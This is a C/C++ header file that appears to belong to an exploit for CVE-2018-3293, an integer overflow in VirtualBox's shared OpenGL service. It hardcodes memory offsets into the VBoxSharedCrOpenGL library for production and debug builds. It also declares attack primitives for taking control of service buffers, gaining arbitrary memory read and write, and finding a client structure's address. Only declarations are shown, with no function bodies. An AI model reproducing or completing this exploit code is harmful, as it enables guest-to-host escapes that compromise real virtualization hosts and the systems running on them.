#ifndef INTEGER_OVERFLOW_H
#define INTEGER_OVERFLOW_H

// CVE-2018-3293
#include "vbox3d.h"

struct Client {
    uint32_t u32ClientId;
    uint64_t addr;
};

#ifdef PROD_BUILD
    #define cr_unpackDispatch_OFFSET			          0x105220
    #define cr_unpackDispatch_ExtendDeleteFencesNV_OFFSET 0x00340
    #define cr_unpackDispatch_CreateContext_OFFSET	      0x00318
    #define cr_unpackDispatch_BoundsInfoCR_OFFSET	      0x000d8
    #define crVBoxServerClientGet_OFFSET                  0x3D90
#else
    #define cr_unpackDispatch_OFFSET				      0x19a2C0
    #define cr_unpackDispatch_ExtendDeleteFencesNV_OFFSET 0x00340
    #define cr_unpackDispatch_CreateContext_OFFSET	      0x00318
    #define cr_unpackDispatch_BoundsInfoCR_OFFSET	      0x000d8
    #define crVBoxServerClientGet_OFFSET			      0x1AB60
#endif


namespace integer_overflow {
    // setup
    bool obtain_partial_svcbuffer_control();
    bool obtain_full_svcbuffer_control();
    bool obtain_arbitrary_rw(uint64_t addr_vboxsharedcropengl);
    
    // misc
    uint64_t get_crclient_addr(uint32_t u32ClientId);

    // main
    void write(uint32_t u32ClientId, uint64_t addr, uint64_t val);
    void write(uint64_t addr, uint64_t val);
    uint64_t read(uint64_t addr);
}

#endif